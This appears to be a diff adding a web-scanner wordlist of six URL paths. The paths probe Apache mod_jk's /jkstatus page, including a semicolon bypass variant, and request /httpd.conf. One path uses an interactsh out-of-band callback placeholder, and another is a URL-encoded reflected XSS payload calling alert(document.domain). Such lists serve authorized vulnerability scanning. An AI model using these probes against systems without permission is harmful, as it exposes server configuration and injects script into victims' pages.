@@ -1,0 +1,6 @@
+/jkstatus
+/jkstatus;
+/%5C%5C{{interactsh-url}}/apachehttpd
+/httpd.conf
+
+/%2F..%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
